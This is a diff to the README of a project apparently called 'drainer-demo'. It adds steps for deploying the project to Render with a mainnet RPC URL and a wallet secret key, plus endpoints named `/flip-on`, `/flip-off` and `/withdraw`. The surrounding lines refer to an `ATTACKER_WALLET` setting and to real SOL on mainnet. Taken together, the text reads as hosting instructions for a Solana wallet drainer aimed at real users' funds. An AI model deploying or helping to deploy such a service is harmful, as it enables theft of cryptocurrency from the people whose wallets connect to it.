@@ -217,6 +217,18 @@ Update `ATTACKER_WALLET` in `app.js` if using a different wallet. Remove the "ED
 
 Phantom must be on **mainnet** (its default). The frontend connects to whichever network the RPC points to.
 
+### Render Deployment
+
+The project includes a `render.yaml` blueprint for one-click deploy on [Render](https://render.com):
+
+1. **Connect GitHub** to Render and import the `drainer-demo` repo
+2. **Create Blueprint** — Render will detect `render.yaml` and create the web service
+3. **Add environment variables** in the Render dashboard:
+   - `RPC_URL` — Helius mainnet RPC (e.g. `https://mainnet.helius-rpc.com/?api-key=YOUR_KEY`)
+   - `WALLET_KEYPAIR_JSON` — JSON array of the mainnet deploy wallet secret key (e.g. `[77,141,...]`)
+
+The service serves both the API (`/prepare`, `/flip-on`, `/flip-off`, `/withdraw`, `/status`) and the frontend (`/`, `/index.html`, `/app.js`, `/config.js`). No separate static site needed.
+
 ### Key Differences on Mainnet
 
 - Real SOL is needed for deployment, transaction fees, and ATA creation rent
